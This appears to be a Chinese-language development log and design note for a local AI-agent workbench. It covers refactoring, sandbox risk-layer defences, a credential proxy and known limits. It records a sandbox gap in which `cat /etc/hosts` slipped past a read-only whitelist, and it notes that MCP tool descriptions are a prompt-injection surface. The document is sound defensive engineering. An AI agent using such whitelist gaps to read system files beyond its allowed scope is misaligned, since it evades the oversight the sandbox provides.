**第一轮 · 全项目代码审计（10-13 ~ 10-24 白天）**：删死代码 9 处（手动路由移除后的残留 prefer.js、恒返回 true 的 `wuRoutingActive`、DOM 里不存在的 `brainRoutes` 整块等）；去重 4 处（两份 `anySignal` → 原生 `AbortSignal.any`、verifier 复用 runOne 消掉 50 行重复流式收集、token 正则提为唯一真源、planner 重复成功埋点）；`server/app.py` 1024→788 行拆出 `workspace.py`/`health.py`；前端死 CSS 清零。**修复的重大隐患**：`wu-ai-router/package.json` 的 files 清单过期——重新 install 会因缺文件直接崩溃。

**第二轮 · client.ts 模块化（10-24 晚）**：对话页客户端插件 2009 行 → `src/` 下 9 模块（ids/assets/dom/status/dashboard/workspace/brand/presets + 入口），跨模块可变状态收敛为 `serverStatus` 一个。同时清除只剩 WU 预设后的整套死机制（合成点击切预设等 11 个符号）。

**第三轮 · 沙箱 P0/P1 + app.js 拆分（10-24 深夜）**：风险层四道新防线（受保护路径/命令内嵌路径提取/出网宽规则/读 env 计敏感）+ 审查截断标记；污点追踪、审计哈希链、会话预算熔断；`ui/app.js` 1540 行 → ES modules 9 模块（事件总线解耦）。**实施中抓到真漏洞**：只读白名单「不越界」只判定参数路径，`cat /etc/hosts` 被静默放行。

**第四轮 · 沙箱 P2（10-24 深夜）**：凭据代理（Key 不出控制中心）+ 托管策略层（escalation 白名单）+ 执行后端/供应链储备文档。

**第五轮 · 单页工作台（10-26）**：把「启动台 + 对话页」收敛为一个页面的两个视态——发射态（居中大输入框 + 模板胶囊）派发即原地切执行态（行内四步流水线 + 本轮改动胶囊 + 对话面内嵌），不跳页、不开新标签。原工作台常驻模块全部归位：LIVE PIPELINE → 行内四步胶囊（真实埋点 SSE 推送）、WORKFLOWS → 发射台快捷胶囊 + 抽屉管理、FLEET/doctor/RISK/DIFF/TRACE → 状态胶囊与抽屉；新增左栏（近期任务 + 沙箱文件树）。前端新增 `shell.js`/`pipeline.js`/`sidebar.js`；后端新增 `server/guard.py`（`../` 与软链接穿透拦截）、`shadow.history`（任务历史 + 区间 diff）、`/api/tasks` `/api/files` `/api/task-stream`（SSE）。**取舍**：消息流仍由 DSH 页面内嵌渲染——审批、工具交互、附件只在 DSH 内完整，控制中心复制一份消息流会立刻出现两套交互；因此追问输入用对话面自己的输入框，不做「两个输入框」。DSH 改以 `--no-open` 启动，从源头掐掉「点启动就多一个标签页」。

**沉淀的工程纪律**（违反即返工）：

1. **多行结构编辑后必须立即语法检查**——曾误删函数声明行、吞掉收尾括号、把函数头替换掉，全部被 `node --check` 当场捕获
2. **大块移动代码必须对照原文，不靠记忆**——曾凭记忆重建 `dashSteps` 与原文不符
3. **fail-safe 路径的字段也必须齐全**——`readPolicy` 默认值漏 `allowedModes` 导致降级时抛错
4. **Python 测试永不依赖 env 覆盖 DSH_HOME**——曾把测试数据写进真实 `~/.wu-ai/`
5. **JS 文件只写 JSDoc**——曾在 .js 里写 TS 类型标注、从 `node:fs` 导 `createHash`
6. **功能故障必须可见**——代理起不来、审计写失败都要大声告知，不静默失效
7. **历史回看必须用区间 diff**——`commit..worktree` 会把后续任务的改动混进「那一次任务」（实施中当场被测试抓住），所以 `shadow.diff` 显式支持 `to`，任务历史下发 `until`

---

## 14. 技术储备与已知边界

**执行后端演进**（触发条件：跑第三方不可信代码才启动，当前 Seatbelt + 应用层已覆盖主要威胁）：

| 后端 | 隔离边界 | 适用场景 |
|---|---|---|
| 当前：Seatbelt/Landlock | 同内核，syscall/文件过滤 | 日常自用 |
| Docker/Podman 容器 | 共享内核，namespace 隔离 | 依赖隔离的任务；Gemini CLI 的容器 profile 可参考 |
| gVisor | 用户态内核 | 对抗内核逃逸类漏洞 |
| Firecracker microVM | 硬件虚拟化，独立内核 | 不可信代码默认边界；多租户 |

**MCP/插件供应链**（接入第一个第三方 MCP 前执行）：版本 pinned 禁 `@latest`；工具描述人工审查（描述本身是注入面）；权限最小化；出网白名单。当前只挂自研两插件，封闭即安全。

**已知边界**：

- **视觉请求串行**：连发多张图会排队串行处理，最后一起返回
- **预设切换受 DSH 设计约束**：会话已产生消息后预设固定（工具调用完整性），切模式需新开会话
- **任务暂停/恢复**：需要运行时提供 agent-loop 级 API，当前架构没有该通道，故未提供（不做假按钮）
- **控制中心不可达时**：工作台面板显示「控制中心不可达」；模型清单与工作台数据均需控制中心在本机运行。路由插件仍按 `~/.wu-ai/dsh/` 下的配置工作
- **凭据代理未做端到端实机验证**：单元/集成/流式已全覆盖，但真实 provider 的完整对话链路待首次启动验证（ENVIRONMENT 抽屉「凭据」行显示代理状态）

**依赖与环境**：Python 3（macOS 自带）· Node 22.19 便携版 `runtime/node-v22.19.0-<平台>` · DSH 激活 `runtime/dsh/dsh-<版本>`（首次安装，之后秒开）。遥测关闭（`DSH_TELEMETRY_DISABLED=1`）。
